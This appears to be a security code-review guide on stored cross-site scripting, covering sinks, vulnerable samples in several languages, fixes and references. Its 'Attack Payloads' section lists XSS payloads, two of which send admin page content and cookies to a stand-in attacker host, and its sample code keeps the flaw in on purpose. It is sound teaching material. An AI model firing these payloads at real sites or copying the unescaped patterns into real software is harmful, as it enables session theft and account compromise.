---
title: Review Stored XSS
keywords:
  - security code review
  - stored xss
  - cross-site scripting
  - output encoding
  - HTML context
description: How to read code for stored cross-site scripting—trace persisted user input into HTML responses and verify context-appropriate encoding.
---

## 4.1 - Review Stored XSS

Stored cross-site scripting appears when the application saves user input and later renders it in HTML without encoding. Start from persistence (database, cache, file) and follow every read path into templates or DOM updates.

## What This Vulnerability Is

Stored XSS is a client-side injection flaw. The application accepts user input, stores it, and later embeds that value in an HTML response (current page or a later view). If the value is not encoded for HTML, the browser may run attacker-supplied script when another user loads the page.

The unsafe assumption is that stored data is safe to render as markup. This maps to [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (Improper Neutralization of Input During Web Page Generation).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Profiles, comments, support tickets, product reviews, admin notes, notification text, searchable stored fields |
| **Input entry** | POST forms, JSON API fields, multipart metadata, background jobs importing user content |
| **Persistence** | SQL/NoSQL columns, object storage, cache keys, session-backed “display name” |
| **HTML sinks** | Server templates, `render_template_string`, email HTML builders, SPA APIs feeding `innerHTML` |
| **Weak controls** | Regex denylist only, `|safe` / `@Html.Raw`, JSP scriptlets, missing auto-escape in templates |
| **High impact views** | Admin dashboards, moderator queues, exports—stored payloads often hit privileged users |

## Attack Payloads

Use these in authorized tests when user input is persisted and later rendered in HTML. Confirm the output context (element body, attribute, script block, URL) before relying on a single payload.

### Pattern 1: Basic script tag (HTML body context)

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Pattern 2: Event handlers without script tags

```html
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### Pattern 3: Attribute breakout (when value is quoted)

```html
"><script>alert(1)</script>
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
```

### Pattern 4: JavaScript URL and data URIs

```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
```

### Pattern 5: Filter evasion and encoding variants

```html
<ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=&#97;lert(1)>
```

### Pattern 6: Stored payloads targeting privileged views

```html
<script>fetch('/admin/users').then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+btoa(t)))</script>
<img src=x onerror="new Image().src='https://attacker.example/?c='+document.cookie">
```

## Language-Specific Sinks and Dangerous APIs

Search for these patterns on every read path from persistence to HTML output. Any API that marks user data as safe HTML or disables auto-escaping is a review priority.

### Python (Flask / Jinja2)

```python
return render_template_string(ticket_body)
return Markup(review_text)
return render_template("reviews.html", summary=summary | safe)
env = Environment(autoescape=False)
Template(user_notification_tpl).render()
```

### Java (JSP / servlets)

```jsp
<%= request.getAttribute("comment") %>
<c:out value="${comment}" escapeXml="false"/>
<div>${userBio}</div>
response.getWriter().write(storedNote);
```

### C# (ASP.NET / Razor)

```csharp
@Html.Raw(Model.UserBio)
return Content(storedHtml, "text/html");
writer.Write(storedComment);  // no encoding
```

### JavaScript (SPA / Node rendering)

```javascript
element.innerHTML = ticket.message;
document.write(review.summary);
$('#review-body').html(storedRating);
dangerouslySetInnerHTML={{ __html: note.content }}
```

### HTML (email and static builders)

```html
<!-- Server builds HTML email with unencoded stored name -->
<p>Hello, <!-- USER_NAME inserted raw --></p>
<td>{{stored_cell_value}}</td>  <!-- template without escape -->
```

### Go (html/template misuse)

```go
template.HTML(storedBio)  // bypasses auto-escape
fmt.Fprintf(w, "<p>%s</p>", storedComment)  // raw write
```

## Sample Vulnerable Code in Python

```python
from flask import Flask, request, redirect, session

app = Flask(__name__)

@app.route("/support/tickets", methods=["POST"])
def create_ticket():
    # Attacker-controlled subject and body persist without encoding policy
    subject = request.form["subject"]
    body = request.form["body"]
    db.execute(
        "INSERT INTO tickets (user_id, subject, body) VALUES (?, ?, ?)",
        (session["user_id"], subject, body),
    )
    return redirect("/support/tickets")

@app.route("/support/tickets")
def list_tickets():
    rows = db.execute(
        "SELECT subject, body FROM tickets ORDER BY created_at DESC LIMIT 20"
    ).fetchall()
    # Sink: stored ticket body concatenated into HTML — no encoding
    html = "<ul>"
    for row in rows:
        html += f"<li><b>{row['subject']}</b><p>{row['body']}</p></li>"
    return html + "</ul>"
```

## Step-by-Step Review Walkthrough

1. **Find write + read pairs.** Search for `INSERT`/`UPDATE` on user-editable fields, then `SELECT` paths that feed HTML. Stored XSS requires both persistence and display.
2. **Trace the Python (or equivalent) write path.** In the sample, `request.form["body"]` flows straight into SQL. Ask whether any canonicalization runs before storage; storage-time stripping is not a substitute for render-time encoding unless the field is strictly non-HTML forever.
3. **Locate every read path for the same column.** Agent queues, email digests, search indexes, and JSON endpoints may reuse ticket `body` without the developer noticing.
4. **Inspect the sink in `list_tickets`.** The loop builds HTML with f-strings. Any stored `<script>` executes in the victim browser. Flag string-built HTML; prefer templates with auto-escape.
5. **Check filters vs encoding.** If you see `bleach.clean` or regex validation, read whether it is allowlist-based and whether output still uses encoding at the template boundary.
6. **Review secondary contexts.** Stored data in `href`, event handlers, `<script type="application/json">`, or Markdown renderers needs context-specific encoding, not only HTML body encoding.
7. **Confirm cross-user impact.** Ask who can view the stored field. Payloads in shared feeds or admin views are often higher severity than self-only profile preview.

## Risk Impact Analysis

**Session and account abuse.** Script in a trusted origin can read non-HttpOnly cookies, perform actions as the victim, or steal anti-CSRF tokens.

**Data and UI integrity.** Attackers can alter visible content, inject fake login forms, or exfiltrate page content to an external host.

**Privilege escalation paths.** Stored XSS in admin-only views is a common path to compromise operators who did not submit the payload.

**Compliance and trust.** Persistent script in customer-facing apps can trigger incident response, breach notification analysis, and reputational harm even when exploitation is limited to a subset of users.

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/reviews")
public String submitReview(@RequestParam String productId, @RequestParam String text) {
    reviewRepo.save(new ProductReview(productId, text, currentUser()));
    return "redirect:/reviews/" + productId;
}

@GetMapping("/reviews/{productId}")
public String productReviews(@PathVariable String productId, Model model) {
    model.addAttribute("reviews", reviewRepo.findByProductId(productId));
    return "product-reviews"; // JSP: ${review.text} without <c:out>
}
```

### C#

```csharp
[HttpPost("announcements")]
public IActionResult PostAnnouncement(string title, string message) {
    _db.Announcements.Add(new Announcement { Title = title, Body = message });
    _db.SaveChanges();
    return RedirectToAction("Feed");
}

public IActionResult Feed() {
    var items = _db.Announcements.OrderByDescending(a => a.PostedAt).Take(10).ToList();
    ViewBag.FeedHtml = string.Join("", items.Select(a => $"<article><h3>{a.Title}</h3><p>{a.Body}</p></article>"));
    return View();
}
```

### JavaScript

```javascript
// Stored product review returned from API; SPA renders without encoding
async function submitReview(productId, text) {
  await fetch(`/api/products/${productId}/reviews`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ text }),
  });
}

function renderReviews(reviews) {
  const container = document.getElementById("review-list");
  reviews.forEach((r) => {
    container.innerHTML += `<div class="review">${r.text}</div>`; // persisted payload executes here
  });
}
```

### HTML

```html
<!-- Thymeleaf: stored announcement rendered as raw HTML -->
<div class="announcement" th:utext="${announcement.body}"></div>

<!-- JSP without JSTL escape -->
<c:forEach var="review" items="${reviews}">
  <blockquote class="review">${review.text}</blockquote>
</c:forEach>
```

### Go

```go
func postReview(w http.ResponseWriter, r *http.Request) {
    text := r.FormValue("text")
    productID := r.FormValue("product_id")
    db.Exec("INSERT INTO reviews (product_id, text) VALUES (?, ?)", productID, text)
    http.Redirect(w, r, "/products/"+productID, http.StatusSeeOther)
}

func listReviews(w http.ResponseWriter, r *http.Request) {
    productID := r.URL.Query().Get("id")
    rows, _ := db.Query("SELECT text FROM reviews WHERE product_id = ?", productID)
    for rows.Next() {
        var text string
        rows.Scan(&text)
        fmt.Fprintf(w, "<blockquote>%s</blockquote>", text) // no html.EscapeString / template
    }
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use templates with auto-escaping enabled. Never mark user content safe unless a vetted sanitizer produced it.

```python
from flask import Flask, render_template
from markupsafe import escape

app = Flask(__name__)
app.jinja_env.autoescape = True  # default in Flask for .html

@app.route("/support/tickets")
def list_tickets():
    rows = db.execute("SELECT subject, body FROM tickets ORDER BY created_at DESC").fetchall()
    return render_template("tickets.html", tickets=rows)

# Manual encoding when building non-template fragments:
safe_body = escape(row["body"])
```

**Important:** `|safe` in Jinja2 disables escaping. Use only for trusted, server-generated HTML. For rich text, sanitize with an allowlist library before optional `|safe`.

```python
import bleach

ALLOWED_TAGS = ["b", "i", "p", "a"]
ALLOWED_ATTRS = {"a": ["href", "title"]}
clean_body = bleach.clean(ticket_body, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
```

### Java

Encode at the HTML sink. Prefer JSTL or OWASP Encoder over regex-only input filters.

```jsp
<%@ taglib prefix="c" uri="jakarta.tags.core" %>
<p>Review: <c:out value="${review.text}" /></p>
```

```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(review.getText());
model.addAttribute("safeReview", safe);
```

**Important:** Thymeleaf `th:utext` and unescaped JSP scriptlets bypass default protections. Use `th:text` for untrusted data.

### C#

Razor encodes by default. Avoid `Html.Raw` on persisted fields.

```cshtml
@* Safe default encoding *@
<article><h3>@announcement.Title</h3><p>@announcement.Body</p></article>
```

```csharp
using System.Net;

var encoded = WebUtility.HtmlEncode(announcement.Body);
ViewBag.SafeBody = $"<p>{encoded}</p>";
```

For controlled HTML subsets, use a maintained sanitizer such as [HtmlSanitizer](https://github.com/mganss/HtmlSanitizer) with an explicit policy.

### Go

Use `html/template`, not `text/template`, for HTML responses.

```go
import "html/template"

var reviewTmpl = template.Must(template.New("review").Parse(
    `<blockquote class="review">{{.Text}}</blockquote>`))

func showReview(w http.ResponseWriter, text string) {
    reviewTmpl.Execute(w, struct{ Text string }{Text: text})
}
```

**Important:** `html.EscapeString` helps only when you must build strings manually; templates apply context-aware rules automatically.

## Verify During Review

- Trace **write → storage → every HTML sink** for the same field.
- Confirm templates use framework auto-escape; no `|safe`, `th:utext`, `@Html.Raw`, or `innerHTML` on untrusted stored data.
- Encoding or vetted sanitization happens at **render time**, not only on input.
- Admin and export views treat stored fields like public views.
- CSP and HttpOnly cookies are defense in depth, not the primary XSS control.

## Reference

- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Jinja2 — Controlling autoescaping](https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment.autoescape)
- [MarkupSafe documentation](https://markupsafe.palletsprojects.com/en/stable/)
- [bleach documentation](https://bleach.readthedocs.io/en/latest/)
- [Python html.escape](https://docs.python.org/3/library/html.html#html.escape)
- [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)
- [Jakarta Tags — c:out](https://jakarta.ee/specifications/tags/3.0/apidocs/jakarta/tags/core/out)
- [ASP.NET Razor syntax — implicit encoding](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/overview?view=aspnetcore-8.0)
- [WebUtility.HtmlEncode](https://learn.microsoft.com/en-us/dotnet/api/system.net.webutility.htmlencode)
- [Go html/template package](https://pkg.go.dev/html/template)
- [Go html.EscapeString](https://pkg.go.dev/html#EscapeString)
